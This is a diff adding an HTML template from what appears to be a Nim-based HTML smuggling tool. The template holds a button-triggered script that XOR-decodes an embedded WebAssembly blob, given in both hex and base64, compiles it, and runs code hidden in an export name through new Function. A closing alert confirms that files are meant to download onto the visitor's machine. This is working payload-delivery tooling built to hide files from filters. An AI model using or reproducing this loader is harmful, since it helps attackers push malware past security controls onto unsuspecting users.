@@ -1,0 +1,52 @@
+<html>
+    <body>
+        <h1>{{o.signature}}</h1>
+        <h3>smuggle_html_xor_example</h3>
+        <button onclick="myFunction()">Click Me !</button>
+        <script>
+        function runNimWasm(w){for(i of WebAssembly.Module.exports(w)){n=i.name;if(n[0]==';'){new Function('m',n)(w);break}}}
+
+        function myFunction() {
+            const keyHex = "{{o.xorKey.toHex()}}";
+            const keyBytes = Uint8Array.fromHex(keyHex);
+
+            // Hex webassembly
+            const cipherBytes = Uint8Array.fromHex("{{xor_encrypt(o.wasmBytes, o.xorKey).toHex()}}");
+
+            function xorDecode(data, key) {
+                const out = new Uint8Array(data.length);
+                for (let i = 0; i < data.length; i++) {
+                out[i] = data[i] ^ key[i % key.length];
+                }
+                return out;
+            }
+
+            const plainBytes = xorDecode(cipherBytes, keyBytes);
+            WebAssembly.compile(plainBytes).then(runNimWasm);
+
+            // B64 webassembly
+            setTimeout(() => {
+                const cipherBytesV2 = Uint8Array.from(atob("{{b64(xor_encrypt(o.wasmBytes, o.xorKey))}}"), c => c.charCodeAt(0));
+                const plainBytesV2 = xorDecode(cipherBytesV2, keyBytes);
+                WebAssembly.compile(plainBytesV2).then(runNimWasm);
+                
+            }, "500");
+
+
+            // Passing strings - note the \" escapes, remember that this is Nim, so strings are ""
+            const cipherHello = Uint8Array.fromHex("{{xor_encrypt(\"Hello!\", o.xorKey).toHex()}}");
+            const plainHello = xorDecode(cipherHello, keyBytes);
+            const plainText = new TextDecoder().decode(plainHello);
+
+
+            const test = Uint8Array.fromHex("{{xor_encrypt(\"Hello!\", \"\").toHex()}}");
+
+            setTimeout(() => {
+                alert("Should've downloaded two files + passing strings: " + plainText);
+            }, "1000");
+
+        }
+
+        </script>
+    </body>
+</html>
